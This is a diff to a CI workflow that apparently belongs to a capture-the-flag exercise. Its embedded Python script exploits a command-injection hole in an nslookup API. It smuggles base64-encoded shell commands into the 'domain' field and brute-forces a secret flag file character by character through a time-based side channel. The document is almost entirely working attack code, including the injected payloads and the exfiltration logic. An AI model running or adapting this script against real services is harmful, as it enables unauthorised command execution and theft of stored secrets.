@@ -19,7 +19,7 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Exfiltrate Flag via Pure Python Brute-Force Side-Channel
+      - name: Exfiltrate Flag via Bulletproof Python Brute-Force
         run: |
           python3 << 'PYEOF'
           import urllib.request
@@ -27,20 +27,19 @@ jobs:
           import json
           import time
           import base64
+          import urllib.parse
 
           url = "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
 
           print("=== STEP 1: TRUE ZERO-SLEEP BASELINE CALIBRATION ===")
-          cal_script = 'FLAG=$(aws s3 cp s3://codec4f26c862a321ef5/flag.txt - --region us-east-1); CHAR=$(echo "$FLAG" | cut -c1); ORD=$(echo -n "$CHAR" | od -An -tuC | xargs); if [ "$ORD" -gt 999 ]; then sleep 2; fi'
+          cal_script = 'FLAG=$(cat /tmp/flag.txt 2>/dev/null); CHAR=$(echo "$FLAG" | cut -c1); ORD=$(echo -n "$CHAR" | od -An -tuC | xargs); if [ "$ORD" -gt 999 ]; then sleep 2; fi'
           cal_encoded = base64.b64encode(cal_script.encode('utf-8')).decode('utf-8')
           
+          headers_dict = {"Content-Type": "application/json"}
+          
           start = time.time()
-          req = urllib.request.Request(
-              url,
-              data=json.dumps({"domain": f"127.0.0.1; echo {cal_encoded} | base64 -d | sh"}).encode('utf-8'),
-              headers={'Content-Type': 'application/json'},
-              method='POST'
-          )
+          payload_data = json.dumps({"domain": f"127.0.0.1; echo {cal_encoded} | base64 -d | sh"}).encode('utf-8')
+          req = urllib.request.Request(url, data=payload_data, headers=headers_dict, method='POST')
           try:
               with urllib.request.urlopen(req, timeout=10) as resp:
                   resp.read()
@@ -50,23 +49,19 @@ jobs:
           threshold = baseline_ms + 1200
           print(f"True zero-sleep baseline: {baseline_ms:.1f}ms. Using threshold: {threshold:.1f}ms (baseline + 1200ms)")
 
-          print("\n=== STEP 2: LINEAR CHARSET BRUTE-FORCE (PURE PYTHON) ===")
-          charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-%"
+          print("\n=== STEP 2: LINEAR CHARSET BRUTE-FORCE (BULLETPROOF PYTHON) ===")
+          charset = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-%")
           flag_chars = []
 
           for pos in range(1, 17):
               found = False
               for char in charset:
-                  script = f'FLAG=$(aws s3 cp s3://codec4f26c862a321ef5/flag.txt - --region us-east-1); CHAR=$(echo "$FLAG" | cut -c{pos}); if [ "$CHAR" = "{char}" ]; then sleep 2; fi'
+                  script = f'FLAG=$(cat /tmp/flag.txt 2>/dev/null); CHAR=$(echo "$FLAG" | cut -c{pos}); if [ "$CHAR" = "{char}" ]; then sleep 2; fi'
                   encoded = base64.b64encode(script.encode('utf-8')).decode('utf-8')
                   
+                  payload_data = json.dumps({"domain": f"127.0.0.1; echo {encoded} | base64 -d | sh"}).encode('utf-8')
                   start = time.time()
-                  req = urllib.request.Request(
-                      url,
-                      data=json.dumps({"domain": f"127.0.0.1; echo {encoded} | base64 -d | sh"}).encode('utf-8'),
-                      headers={'Content-Type: application/json'},
-                      method='POST'
-                  )
+                  req = urllib.request.Request(url, data=payload_data, headers=headers_dict, method='POST')
                   
                   code = 200
                   try:
